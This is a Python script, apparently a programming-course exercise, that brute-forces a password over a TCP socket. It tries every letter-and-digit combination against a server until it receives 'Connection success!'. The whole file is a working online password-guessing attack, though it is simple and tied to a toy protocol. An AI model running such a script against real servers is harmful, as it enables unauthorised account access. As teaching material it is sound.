import argparse
import socket
import itertools
import string
from typing import Generator


class PassHacker:
    """Password Hacker class"""

    def __init__(self, hostname: str, port: id) -> None:
        """
        Constructor
        :param hostname: ip_address of the server
        :param port: port number to connect
        """
        self.hostname = hostname
        self.port = port
        self.client = None

    def connect(self) -> None:
        """Connects to the server"""
        self.client = socket.socket()
        self.client.connect((self.hostname, self.port))

    def send_message(self, message) -> None:
        """Sends message to the server"""
        message = message.encode()
        self.client.send(message)

    def receive_response(self) -> str:
        """Get and decode response from the server"""
        response = self.client.recv(1024)
        return response.decode()

    def close(self):
        """Close connection"""
        self.client.close()

    @staticmethod
    def generate_password() -> Generator:
        """Returns generator of passwords of increasing length
        using chars from string.ascii_letters + string.digits
        :return: Generator"""
        chars = string.ascii_letters + string.digits
        for length in range(1, len(chars) + 1):
            for combination in itertools.product(chars, repeat=length):
                yield ''.join(combination)

    def run(self):
        """Hack-time :)"""
        self.connect()
        password_generator = PassHacker.generate_password()
        while True:
            password = next(password_generator)
            self.send_message(password)
            response = self.receive_response()
            if response == 'Connection success!':
                print(password)
                self.close()
                break


def read_args():
    """
    :return: tuple of ip_address, port and message
    """
    parser = argparse.ArgumentParser(description='Password Hacker')
    parser.add_argument('ip_address', type=str, help='IP address')
    parser.add_argument('port', type=int, help='port number')
    args = parser.parse_args()

    return args.ip_address, args.port


if __name__ == '__main__':
    ip_address, port = read_args()
    pass_hacker = PassHacker(ip_address, port)
    pass_hacker.run()
